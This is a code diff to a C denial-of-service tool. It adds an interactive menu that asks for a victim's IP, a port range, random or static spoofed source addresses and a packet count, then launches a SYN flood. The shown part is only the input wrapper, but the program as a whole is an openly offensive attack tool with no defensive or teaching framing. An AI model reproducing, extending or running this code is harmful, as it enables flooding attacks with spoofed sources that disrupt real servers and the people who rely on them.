@@ -147,6 +147,51 @@ void syn_flood (char * victimServerIp, int portStart, int portEnd, int randomIp,
 	printf("Attack completed. %d packets sent.\n", nPacketSent);	
 }
 void syn_flood_setup(){
+	system("clear");
+	printf("\033[01;33m"); //set color to yellow
     printf("╚»★«╝ SYN FLOOD ATTACK ╚»★«╝\n");
-    syn_flood("1.2.3.4", 20, 30, 1, 'A', "192.168.3.3", 10);
+	printf("\033[0m");//reset color
+
+	char victimIp[32];
+	int portStart = 0;
+	int portEnd = 0;
+	int randomSourceIp = 1;
+	char ipClass = ' ';
+	char sourceIp[32];
+	int nPackets;
+
+	sourceIp[0] = 0;
+
+	while ((getchar()) != '\n'); //clear out buffer
+	
+	//take input from user
+	printf ("Enter victim's IP : ");
+	fgets(victimIp, 32, stdin);
+	victimIp[strcspn(victimIp, "\n")] = 0;
+
+	printf ("Enter start of port range : ");
+	scanf ("%d", &portStart);
+
+	printf ("Enter end of port range : ");
+	scanf ("%d", &portEnd);
+
+	printf ("Want random source IPs? (1 for yes/ 0 for no) ? : ");
+	scanf ("%d", &randomSourceIp);
+
+	if (randomSourceIp){
+		printf ("Enter IP Class (A, B, C, D) : ");
+		scanf (" %c", &ipClass);
+	}
+	else{
+		printf ("Enter static source IP : ");
+		fgets(sourceIp, 32, stdin);
+		sourceIp[strcspn(sourceIp, "\n")] = 0;
+	}
+
+	printf ("Enter number of packets to send : ");
+	scanf ("%d", &nPackets);
+
+	//TODO  display all the inputs before starting the attack
+
+    syn_flood(victimIp, portStart, portEnd, randomSourceIp, ipClass, sourceIp, nPackets);
 }
